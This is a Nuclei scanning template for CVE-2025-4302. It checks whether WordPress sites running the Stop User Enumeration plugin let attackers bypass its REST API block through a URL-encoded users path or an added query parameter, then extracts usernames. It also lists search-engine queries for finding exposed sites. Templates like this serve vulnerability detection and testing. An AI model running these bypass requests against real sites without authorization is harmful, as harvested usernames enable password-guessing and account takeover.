id: CVE-2025-4302

info:
  name: Stop User Enumeration - Protection Bypass
  author: Kazgangap
  severity: medium
  description: |
    The plugin blocks REST API /wp-json/wp/v2/users/ requests for non-authorized users. However, this can be bypassed by URL-encoding the API path.
  reference:
    - https://wpscan.com/vulnerability/19f67d6e-4ffe-4126-ac42-fb23c5017a3e/
    - https://github.com/Kazgangap/cve-poc-garage/blob/main/2025/CVE-2025-4302.md
    - https://nvd.nist.gov/vuln/detail/cve-2025-4302
  metadata:
    verified: true
    vendor: fullworks
    product: stop-user-enumeration
    framework: wordpress
    shodan-query: http.html:"/wp-content/plugins/stop-user-enumeration/"
    fofa-query: body=/wp-content/plugins/stop-user-enumeration/
    publicwww-query: "/wp-content/plugins/stop-user-enumeration/"
  tags: cve,cve2025,wordpress,wpscan

flow: http(1) && http(2)

http:
  - method: GET
    path:
      - "{{BaseURL}}/"

    matchers:
      - type: dsl
        dsl:
          - 'contains(body, "stop-user-enumeration")'
        condition: and
        internal: true
        
  - method: GET
    path:
      - "{{BaseURL}}/wp-json/wp/v2/users?foo=simple-jwt-login" # v < 1.7.2 
      - "{{BaseURL}}/%77%70%2d%6a%73%6f%6e%2f%77%70%2f%76%32%2f%75%73%65%72%73%2f" #v < 1.7.3

    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"id":'
          - '"name":'
          - '"slug":'
        condition: and

      - type: word
        part: header
        words:
          - "application/json"

      - type: status
        status:
          - 200

    extractors:
      - type: json
        name: usernames
        json:
          - '.[] | .slug'
          - '.[].name'
        part: body
